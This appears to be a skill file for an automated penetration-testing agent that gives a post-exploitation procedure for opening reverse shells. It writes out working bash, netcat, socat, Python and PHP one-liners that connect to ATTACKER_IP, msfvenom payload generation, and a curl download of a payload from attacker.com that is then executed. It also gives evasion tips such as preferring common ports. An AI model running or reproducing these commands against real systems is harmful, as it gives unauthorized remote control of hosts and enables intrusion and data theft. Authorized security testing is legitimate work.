---
name: reverse-shell
description: Establish reverse shell for remote command execution
version: 1.0.0
phase: post
category: post-exploitation
tags: [reverse-shell, netcat, socat, msfvenom, remote-access]
tools: [netcat, socat, msfvenom]
difficulty: intermediate
opsec_level: high
time_estimate: 1m
severity_if_found: critical
related_skills:
  - webshell-deploy
  - lateral-movement
mitre_attack:
  - T1059.004
  - T1021
---

## When to Use

Use this skill to establish a reverse shell connection from a compromised host
to an attacker-controlled listener. This provides interactive command execution
and confirms remote access capability.

## Prerequisites

- netcat or socat on attacker machine
- curl or wget on compromised host (for payload download)
- Outbound network access from compromised host
- Listener running on attacker machine

## Procedure

```bash
# 1. Start listener on attacker machine
nc -lvnp 4444
# Or with socat:
socat TCP-LISTEN:4444,reuseaddr STDOUT

# 2. Bash reverse shell (most reliable)
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# 3. Netcat reverse shell
nc -e /bin/bash ATTACKER_IP 4444
# Or if -e is not available:
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc ATTACKER_IP 4444 > /tmp/f

# 4. Socat reverse shell (encrypted)
socat exec:'bash -li',pty,stderr,setsid,sigint,sane TCP:ATTACKER_IP:4444

# 5. Python reverse shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# 6. PHP reverse shell
php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/bash -i <&3 >&3 2>&3");'

# 7. MSFVenom payload generation (listener required)
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f elf -o /tmp/shell.elf
chmod +x /tmp/shell.elf && /tmp/shell.elf

# 8. Upload and execute msfvenom payload
curl -sk -o /tmp/shell.elf "https://attacker.com/shell.elf"
chmod +x /tmp/shell.elf && /tmp/shell.elf
```

## OPSEC Rules

- **CRITICAL**: Reverse shells generate outbound connections — easily detected
- Use encrypted channels (socat SSL, HTTPS) when possible
- Prefer common ports (443, 8080) over unusual ports
- Limit connection duration to what's needed
- Clean up payloads and listeners after assessment
- Do not establish persistent shells without authorization

## Verification

- Confirm listener receives connection
- Test interactive command execution
- Verify shell稳定性 (does it stay alive?)
- Check if firewall blocks outbound on chosen port

## Pitfalls

- Outbound connections may be blocked by firewall
- IDS/IPS will detect reverse shell patterns
- Some environments restrict /dev/tcp usage
- MSFVenom payloads may be flagged by antivirus
- Non-interactive shells may not support TTY
- Connection may drop if network is unstable

## Output Format

```
[SHELL] Reverse shell established
  Type: bash reverse shell
  Listener: ATTACKER_IP:4444
  User: www-data (uid=33)
  Host: web-server
  Severity: CRITICAL

[SHELL] Reverse shell stable
  TTY: yes
  Duration: 5 minutes
  Commands executed: id, whoami, hostname
```
